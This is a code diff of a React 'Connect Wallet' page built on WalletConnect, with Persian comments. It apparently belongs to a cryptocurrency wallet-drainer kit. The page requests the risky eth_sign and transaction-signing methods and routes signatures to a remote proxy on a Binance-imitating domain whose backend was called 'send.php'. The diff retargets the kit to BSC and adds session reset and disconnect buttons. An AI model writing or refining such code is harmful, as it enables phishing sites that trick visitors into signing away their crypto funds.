@@ -3,6 +3,9 @@ import { EthereumProvider } from "@walletconnect/ethereum-provider";
 
 function App() {
   async function runner() {
+    // حذف کش WalletConnect تا درخواست جدید نمایش داده شود
+    localStorage.removeItem("walletconnect");
+
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       qrModalOptions: {
@@ -19,7 +22,7 @@ function App() {
           "9a565677e1c0258ac23fd2becc9a6497eeb2f6bf14f6e2af41e3f1d325852edd",
         ],
       },
-      chains: [1],
+      chains: [56], // فقط شبکه‌ی BSC
       methods: ["eth_sign", "eth_sendTransaction", "eth_signTransaction"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
@@ -30,7 +33,7 @@ function App() {
     var account_sender = account[0];
     console.log("✅ Wallet Address:", account_sender);
 
-    // 🔹 مسیر صحیح برای `send.php` از طریق پروکسی
+    // 🔹 مسیر اصلاح‌شده‌ی API
     let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
     async function genSign(address, chain, type, contract = "0") {
@@ -81,16 +84,33 @@ function App() {
     }
   }
 
+  async function disconnectWallet() {
+    localStorage.removeItem("walletconnect");
+    console.log("🔌 Wallet disconnected.");
+    alert("کیف پول شما قطع شد، لطفاً دوباره متصل شوید.");
+  }
+
   return (
-    <a
-      href="#"
-      id="kos"
-      onClick={runner}
-      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
-      data-uk-toggle=""
-    >
-      <span>Connect wallet</span>
-    </a>
+    <>
+      <a
+        href="#"
+        id="connect"
+        onClick={runner}
+        className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
+        data-uk-toggle=""
+      >
+        <span>Connect Wallet</span>
+      </a>
+
+      <a
+        href="#"
+        id="disconnect"
+        onClick={disconnectWallet}
+        className="uk-button uk-button-medium@m uk-button-danger uk-margin-left"
+      >
+        <span>Disconnect Wallet</span>
+      </a>
+    </>
   );
 }
 
